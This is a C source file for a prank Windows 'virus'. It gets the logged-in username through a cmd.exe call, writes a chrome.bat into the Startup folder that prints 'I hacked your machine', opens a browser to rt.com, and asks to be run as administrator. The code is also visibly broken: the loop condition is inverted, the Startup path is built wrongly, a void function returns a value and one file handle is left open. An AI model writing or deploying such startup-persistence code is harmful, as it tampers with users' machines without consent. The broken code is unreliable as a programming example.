#include "utility_functions.h"

void run_commands_in_win_cmd()
{
    system("cmd.exe /c \"echo %username%\">user ");
}

char *get_the_user_logged_at_the_computer_the_geek_way()
{
    static char username[100];

    FILE *pFileUser=NULL;
    char mychar;
    int i=0;

    run_commands_in_win_cmd();

    pFileUser=fopen("user","r");

    if(!pFileUser)
    {
        perror("Error when opening file stream"); //of course, this is not a real virus, since I am using error messages, right? :)
        exit(1);
    }

    while(!feof(pFileUser))
    {
        fscanf(pFileUser,"%c",&mychar); //get the username logged currently at the computer, character by character until ending the line

        if(mychar=='\n')
        {
            break;
        }

        username[i]=mychar;
        i++;
    }

    username[i]='\0';

    remove("user");

    printf("%s",username);

    return username;
}


char *get_the_user_logged_at_the_computer_the_simple_way()
{
    static char *username;
    username=getenv("USERNAME");

/* =======================================================
The list with complete Environment Variables in Windows 10 and their standard values
=========================================================
%ALLUSERSPROFILE%	C:\ProgramData
%APPDATA%	C:\Users\{username}\AppData\Roaming
%COMMONPROGRAMFILES%	C:\Program Files\Common Files
%COMMONPROGRAMFILES(x86)%	C:\Program Files (x86)\Common Files
%CommonProgramW6432%	C:\Program Files\Common Files
%COMSPEC%	C:\Windows\System32\cmd.exe
%HOMEDRIVE%	C:\
%HOMEPATH%	C:\Users\{username}
%LOCALAPPDATA%	C:\Users\{username}\AppData\Local
%LOGONSERVER%	\\{domain_logon_server}
%PATH%	C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem
%PathExt%	.com;.exe;.bat;.cmd;.vbs;.vbe;.js;.jse;.wsf;.wsh;.msc
%PROGRAMDATA%	C:\ProgramData
%PROGRAMFILES%	C:\Program Files
%ProgramW6432%	C:\Program Files
%PROGRAMFILES(X86)%	C:\Program Files (x86)
%PROMPT%	$P$G
%SystemDrive%	C:
%SystemRoot%	C:\Windows
%TEMP%	C:\Users\{username}\AppData\Local\Temp
%TMP%	C:\Users\{username}\AppData\Local\Temp
%USERDOMAIN%	Userdomain associated with current user.
%USERDOMAIN_ROAMINGPROFILE%	Userdomain associated with roaming profile.
%USERNAME%	{username}
%USERPROFILE%	C:\Users\{username}
%WINDIR%	C:\Windows
%PUBLIC%	C:\Users\Public
%PSModulePath%	%SystemRoot%\system32\WindowsPowerShell\v1.0\Modules\
%OneDrive%	C:\Users\{username}\OneDrive
%DriverData%	C:\Windows\System32\Drivers\DriverData
%CD%	Outputs current directory path. (Command Prompt.)
%CMDCMDLINE%	Outputs command line used to launch current Command Prompt session. (Command Prompt.)
%CMDEXTVERSION%	Outputs the number of current command processor extensions. (Command Prompt.)
%COMPUTERNAME%	Outputs the system name.
%DATE%	Outputs current date. (Command Prompt.)
%TIME%	Outputs time. (Command Prompt.)
%ERRORLEVEL%	Outputs the number of defining exit status of previous command. (Command Prompt.)
%PROCESSOR_IDENTIFIER%	Outputs processor identifier.
%PROCESSOR_LEVEL%	Outputs processor level.
%PROCESSOR_REVISION%	Outputs processor revision.
%NUMBER_OF_PROCESSORS%	Outputs the number of physical and virtual cores.
%RANDOM%	Outputs random number from 0 through 32767.
%OS%	Windows_NT
================================================= */

    return username;
}


char  *point_towards_the_target_file_for_modification()
{
    static char target_path[400];

    FILE *pFileUser=NULL;
    char user_name[300];
    char mychar;
    int i=0;

    run_commands_in_win_cmd();

    pFileUser=fopen("user","r");

    if(!pFileUser)
    {
        perror("Error when opening file stream"); //of course, this is not a real virus, since I am using error messages, right? :)
        exit(1);
    }

    while(feof(pFileUser))
    {
        fscanf(pFileUser,"%c",&mychar); //get the username logged currently at the computer, character by character until ending the line

        if(mychar=='\n')
        {
            break;
        }

        user_name[i]=mychar;
        i++;
    }

    user_name[i]='\0';

    strcpy(target_path,user_name);

    strcat(target_path,"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\chrome.bat");
    fclose(pFileUser);

    remove("user");

    return target_path;
}

void run_the_fun(char *destination_users_chrome_bat)
{
    FILE *pFile=NULL;

    pFile=fopen(destination_users_chrome_bat,"w");

    if(!pFile)
    {
        //it means that the current user does not have access rights to modify the chrome.bat file
        pFile=fopen(PATH_TO_GENERAL_CHROME_BAT,"w");
        if(!pFile)
        {
            system("cls"); //clear screen
            printf("You need to run this program as ADMINISTRATOR.\n");
            system("timeout 5"); //Timeout will pause command execution for a number of seconds, after which it continues without requiring a user keystroke. If the user does press a key at any point, execution will resume immediately.
            return 0;
        }
        fprintf(pFile,"echo off\n echo I hacked your machine \n pause");
        fclose(pFile);
        system("start chrome http://www.rt.com");
        return 0;
    }

    fprintf(pFile,"echo off\n echo I hacked your machine \n pause");
    fclose(pFile);

}
